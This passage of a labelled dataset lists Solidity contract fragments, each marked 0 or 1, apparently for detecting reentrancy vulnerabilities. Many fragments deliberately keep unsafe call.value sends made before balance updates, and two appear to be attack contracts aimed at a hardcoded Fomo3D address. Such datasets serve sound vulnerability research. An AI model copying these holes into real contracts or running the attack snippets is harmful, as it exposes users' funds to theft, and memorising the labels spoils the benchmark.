receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1922 28869.sol
28869.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1923 18438.sol
18438.sol
function invest() public {
uint256 amountToSend = address(this).balance;
if(amountToSend > 1){
uint256 half = amountToSend / 2;
require(sk2xContract.call.value(half)());
p3dContract.buy.value(half)(msg.sender);
function donate() payable public {
require(sk2xContract.call.value(msg.value).gas(1000000)());
0
---------------------------------
1924 14758.sol
14758.sol
function wcf(address target, uint256 a) payable {
require(msg.sender == owner);
uint startBalance = this.balance;
target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
if (this.balance <= startBalance) revert();
owner.transfer(this.balance);
0
---------------------------------
1925 14994.sol
14994.sol
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
0
---------------------------------
1926 35806.sol
35806.sol
function withdraw(uint amount) {
require(tokens[0][msg.sender] >= amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
require(msg.sender.call.value(amount)());
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1927 40241.sol
40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1928 21697.sol
21697.sol
function Jump() public payable  {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
1
---------------------------------
1929 10107.sol
10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1930 39191.sol
39191.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {  throw; }
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
0
---------------------------------
1931 5515.sol
5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1932 17009.sol
17009.sol
function Pay(address _destination) public payable {
require(_destination != 0x0);
require(msg.value > 0);
require(!paused);
masterWallet.transfer(msg.value.div(9));
_destination.call.value(msg.value.div(9).mul(8))();
SettleFund(_destination, msg.value);
1
---------------------------------
1933 23421.sol
23421.sol
function _safeCall(address _to, uint _amount) internal {
require(_to != 0);
require(_to.call.value(_amount)());
function multiCall(address[] _address, uint[] _amount) payable public returns(bool) {
for (uint i = 0; i < _address.length; i++) {
_safeCall(_address[i], _amount[i]);
return true;
1
---------------------------------
1934 27486.sol
27486.sol
function Command(address adr,bytes data)  payable  public  {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1935 40353.sol
40353.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1936 39684.sol
39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
contract SeriesFactory {
address public seriesFactory;
address public owner;
0
---------------------------------
1937 9611.sol
9611.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1938 23387.sol
23387.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId){
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1939 27334.sol
27334.sol
function participate() payable {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if ( luckyNumberOfAddress(msg.sender) == luckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1940 39644.sol
39644.sol
function revoke(address transactor, address transactee) {
if (msg.sender != transactor && msg.sender != transactee) { throw; }
if(!verify(transactor, transactee)) { throw; }
uint32 deposit = _verifications[transactor][transactee];
delete _verifications[transactor][transactee];
if (!transactee.call.value(deposit).gas(23000)()) {  throw;  }
RevokeEvent(transactor, transactee, deposit);
0
---------------------------------
1941 36563.sol
36563.sol
function forward(address _destination, uint256 _value, bytes _data) onlyOwner {
require(_destination != address(0));
assert(_destination.call.value(_value)(_data));
if (_value > 0) {
Withdrawal(_destination, _value, _data);
function() payable {
Deposit(msg.sender, msg.value);
0
---------------------------------
1942 11719.sol
11719.sol
function Collect(uint _am) public payable {
if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {
if(msg.sender.call.value(_am)())  {
balances[msg.sender]-=_am;
Log.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Deposit();
contract LogFile
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1943 24007.sol
24007.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
1944 1879.sol
1879.sol
function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin {
_upgradeTo(newImplementation);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
1945 39269.sol
39269.sol
function sendPending() public preventReentry isHolder(msg.sender) returns (bool){
if (ptxTail == ptxHead) return false;
TX memory tx = pendingTxs[ptxTail];
if(now < tx.timeLock) return false;
delete pendingTxs[ptxTail++];
if(!tx.blocked) {
if(tx.to.call.value(tx.value)(tx.data)) {
committedEther -= tx.value;
Withdrawal(tx.from, tx.to, tx.value);
return true;
if (tx.from == address(this)) {
committedEther -= tx.value;
} else {
holders[tx.from].etherBalance += tx.value;
TransactionFailed(tx.from, tx.to, tx.value);
return false;
0
---------------------------------
1946 10604.sol
10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1947 26188.sol
26188.sol
function GetPrizeFund() public payable {
require(now>EndTime);
require(Bids[msg.sender]>=MaxOffer);
uint prizeAmount = Bids[msg.sender]+PrizeFund;
PrizeFund = 0;
Bids[msg.sender]=0;
msg.sender.call.value(prizeAmount);
function RevokeBid() public payable {
require(now>EndTime);
uint toTransfer = Bids[msg.sender];
Bids[msg.sender]=0;
msg.sender.call.value(toTransfer);
0
---------------------------------
1948 2021.sol
2021.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _safeSend(address _to, uint _value) internal {
if (!_unsafeSend(_to, _value)) {
throw;
0
---------------------------------
1949 14274.sol
14274.sol
function withdraw(uint _amount) {
require(tokens[0][msg.sender] >= _amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount);
if (!msg.sender.call.value(_amount)()) {
revert();
Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]);
function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,   uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable {
uint totalValue = safeMul(_amount, 1004) / 1000;
if (_tokenGet == address(0)) {
if (msg.value != totalValue) {
revert();
TokenStore(_store).deposit.value(totalValue)();
} else {
if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) {
revert();
if (!Token(_tokenGet).approve(_store, totalValue)) {
revert();
TokenStore(_store).depositToken(_tokenGet, totalValue);
TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive,
_expires, _nonce, _user, _v, _r, _s, _amount);
totalValue = TokenStore(_store).balanceOf(_tokenGive, this);
uint customerValue = safeMul(_amountGive, _amount) / _amountGet;
if (_tokenGive == address(0)) {
TokenStore(_store).withdraw(totalValue);
msg.sender.transfer(customerValue);
} else {
TokenStore(_store).withdrawToken(_tokenGive, totalValue);
if (!Token(_tokenGive).transfer(msg.sender, customerValue)) {
revert();
0
---------------------------------
1950 40341.sol
40341.sol
function carefulSendWithFixedGas(address _toAddress,  uint _valueWei,  uint _extraGasIncluded ) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(
address fromAddress,
address toAddress,
uint valueWei
);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded ) internal {
if (msg.value != 0) {   throw;   }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) {  throw;    }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(  _toAddress,   _valueWei,   _extraGasIncluded );
if (!sentOk) { throw;   }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(  compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends  );
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
contract KingdomFactory {
0
---------------------------------
1951 SendBalance.sol
SendBalance.sol
function withdrawBalance(){
if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; }
userBalances[msg.sender] = 0;
1
---------------------------------
1952 39866.sol
39866.sol
function funding() payable {
if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw;
if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*fundingExchangeRate;
Funding(msg.sender,msg.value);
function buy(string _commit) payable{
if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*price;
commit[msg.sender]=_commit;
Buy(msg.sender,msg.value);
1
---------------------------------
1953 39127.sol
39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
1954 39912.sol
39912.sol
function simulatePathwayFromBeneficiary() public payable {
bytes4 buySig = bytes4(sha3("buy()"));
if (!Resilience.call.value(msg.value)(buySig)) throw;
bytes4 transferSig = bytes4(sha3("transfer(address,uint256)"));
if (!Resilience.call(transferSig, msg.sender, msg.value)) throw;
0
---------------------------------
1955 34577.sol
34577.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId)   public   ownerExists(msg.sender)    notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1956 cross-function-reentrancy-fixed.sol
cross-function-reentrancy-fixed.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) {  throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {throw;}
claimedBonus[recipient] = true;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
0
---------------------------------
1957 21999.sol
21999.sol
function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
if (msg.value > 0)
deposit();
require(addr.call.value(amount)(data));
Call(msg.sender, addr, amount);
0
---------------------------------
1958 21755.sol
21755.sol
function Collect(uint _am) public payable  {
var acc = Acc[msg.sender];
if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {
if(msg.sender.call.value(_am)())  {
acc.balance-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function()     public     payable   {
Put(0);
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1959 16884.sol
16884.sol
function mintETHRewards(address _contract,  uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
1960 23803.sol
23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
1961 22074.sol
22074.sol
function Collect(uint _am) public payable {
if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) {
msg.sender.call.value(_am);
Bal[msg.sender]-=_am;
1
---------------------------------
1962 39326.sol
39326.sol
function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
library CreatorCongress {
0
---------------------------------
1963 5629.sol
5629.sol
constructor () public payable {
fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
(,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
require(winnings > 0.1 ether);
fomo.withdraw();
selfdestruct(msg.sender);
0
---------------------------------
1964 3270.sol
3270.sol
function gotake() public {
if (fomo3d.getTimeLeft() > 50) { revert(); }
address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )();
fomo3d.withdraw();
0
---------------------------------
1965 16925.sol
16925.sol
function withdraw() public{
assert(msg.sender.call.value(balances[msg.sender])()) ;
balances[msg.sender] = 0;
1
---------------------------------
1966 21390.sol
21390.sol
function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable  {
if(msg.sender != address(this)) throw;
if(_operation=="In")   {
FundsMove(msg.value,"In",_to);
investors[_to] += _am;
}  else {
uint amTotransfer = 0;
if(_to==_feeToAdr) {
amTotransfer=_am;
}  else {
amTotransfer=_am/100*99;
investors[_feeToAdr]+=_am-amTotransfer;
if(_to.call.value(_am)()==false) throw;
investors[_to] -= _am;
FundsMove(_am, "Out", _to);
function() payable {
In(msg.sender);
function Out(uint amount) payable {
if(investors[msg.sender]<targetAmount)throw;
if(investors[msg.sender]<amount)throw;
this.FundTransfer(amount,"",msg.sender,admin);
function In(address to) payable {
if(to==0x0)to = admin;
if(msg.sender!=tx.origin)throw;
this.FundTransfer(msg.value, "In", to,admin);
1
---------------------------------
1967 2387.sol
2387.sol
function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 &&   transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1968 14458.sol
14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
1969 30101.sol
30101.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1970 9600.sol
9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1971 40425.sol
40425.sol
function BankOwner_WithdrawDonations() public modifier_isContractOwner()  modifier_wasValueSent() {
if (_bankDonationsBalance > 0) {
uint256 amount_ = _bankDonationsBalance;
_bankDonationsBalance = 0;
if (msg.sender.send(amount_)) {
event_bankDonationsWithdrawn(amount_);
}  else if (msg.sender.call.value(amount_)())  {
event_bankDonationsWithdrawn(amount_);
}  else {
_bankDonationsBalance = amount_;
function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  {
_bankAccountsArray[accountNumber_].balance -= amount;
if (msg.sender.send(amount))   {
withdrawalSuccessful_ = true;
else if (msg.sender.call.value(amount)()) {
withdrawalSuccessful_ = true;
}  else {
_bankAccountsArray[accountNumber_].balance += amount;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount);
return false;
function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool)  {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
uint256 fullBalance_ = 0;
if (_bankAccountsArray[accountNumber_].balance > 0)   {
fullBalance_ = _bankAccountsArray[accountNumber_].balance;
_bankAccountsArray[accountNumber_].balance = 0;
if (msg.sender.send(fullBalance_))   {
withdrawalSuccessful_ = true;
}else
if (msg.sender.call.value(fullBalance_)())  {
withdrawalSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance = fullBalance_;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_);
return false;
function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public  modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool transferSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  {
_bankAccountsArray[accountNumber_].balance -= amount;
if (destinationAddress.send(amount))  {
transferSuccessful_ = true;
} else if (destinationAddress.call.value(amount)())      {
transferSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance += amount;
if (transferSuccessful_)  {
event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress);
return true;
} else {
event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress);
return false;
0
---------------------------------
1972 1710.sol
1710.sol
function buyFST0(address receiver) internal {
require(salesPipe.call.value(msg.value)());
uint256 tmpERCBalance = erc.balanceOf(address(this));
uint256 tmpEthBalance = address(this).balance;
if (tmpERCBalance > 0) {
require(erc.transfer(receiver, tmpERCBalance));    }
if (tmpEthBalance > 0) {
require(receiver.send(tmpEthBalance));
function buyFST (address receiver) public payable {
buyFST0(receiver);
function buyFST () public payable {
buyFST0(msg.sender);
function () external payable {
buyFST0(msg.sender);
0
---------------------------------
1973 40038.sol
40038.sol
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
if (_to == address(tokenCtr)) throw;
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if(!_to.call.value(_value)(_data))
return 0;
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
1
---------------------------------
1974 9221.sol
9221.sol
function bet() payable {
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  {
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount) {
if (gameOwner==msg.sender)  {
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
1975 3255.sol
3255.sol
function endRound(LOLdatasets.EventReturns memory _eventData_)
private
returns (LOLdatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = 0;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_)
private
returns(LOLdatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_com = _com.add(_aff);
address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()")));
return(_eventData_);
0
---------------------------------
1976 39705.sol
39705.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
1977 39664.sol
39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
1978 12182.sol
12182.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
1979 13952.sol
13952.sol
function removeBankroll(uint _amount, string _callbackFn)
public
returns (uint _recalled)
address _bankroller = msg.sender;
uint _collateral = getCollateral();
uint _balance = address(this).balance;
uint _available = _balance > _collateral ? _balance - _collateral : 0;
if (_amount > _available) _amount = _available;
_amount = ledger.subtract(_bankroller, _amount);
bankroll = ledger.total();
if (_amount == 0) return;
bytes4 _sig = bytes4(keccak256(_callbackFn));
require(_bankroller.call.value(_amount)(_sig));
emit BankrollRemoved(now, _bankroller, _amount, bankroll);
return _amount;
function sendProfits()
public
returns (uint _profits)
int _p = profits();
if (_p <= 0) return;
_profits = uint(_p);
profitsSent += _profits;
address _tr = getTreasury();
require(_tr.call.value(_profits)());
emit ProfitsSent(now, _tr, _profits);
function _betFailure(string _msg, uint _bet, bool _doRefund)
private
if (_doRefund) require(msg.sender.call.value(_bet)());
emit BetFailure(now, msg.sender, _bet, _msg);
function _uncreditUser(address _user, uint _amt)
private
if (_amt > credits[_user] || _amt == 0) _amt = credits[_user];
if (_amt == 0) return;
vars.totalCredits -= uint88(_amt);
credits[_user] -= _amt;
require(_user.call.value(_amt)());
emit CreditsCashedout(now, _user, _amt);
1
---------------------------------
1980 21886.sol
21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
